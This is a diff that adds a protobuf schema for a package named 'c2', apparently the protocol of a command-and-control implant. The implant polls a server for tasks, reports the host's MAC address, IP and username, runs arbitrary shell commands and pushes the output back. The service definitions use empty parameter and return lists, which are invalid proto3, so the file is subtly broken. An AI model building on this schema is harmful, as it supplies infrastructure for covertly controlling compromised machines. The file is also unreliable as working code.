@@ -1,0 +1,40 @@
+syntax = "proto3";
+package c2;
+
+message InfoReq {
+
+}
+message ExecuteReq {
+    string cmd = 1;
+}
+
+message Task {
+    oneof data {
+        InfoReq info = 1;
+        ExecuteReq execute = 2;
+    }
+}
+
+
+message InfoRes {
+    string mac = 1;
+    string ip = 2;
+    string username = 3;
+}
+
+message ExecuteRes {
+    bool status = 1;
+    string data = 2;
+}
+
+message TaskResult {
+    oneof data {
+        InfoRes info = 1;
+        ExecuteRes execute = 2;
+    }
+}
+
+service TaskService {
+    rpc PollTask () returns (Task);
+    rpc PushTaskResult (TaskResult) returns ();
+}
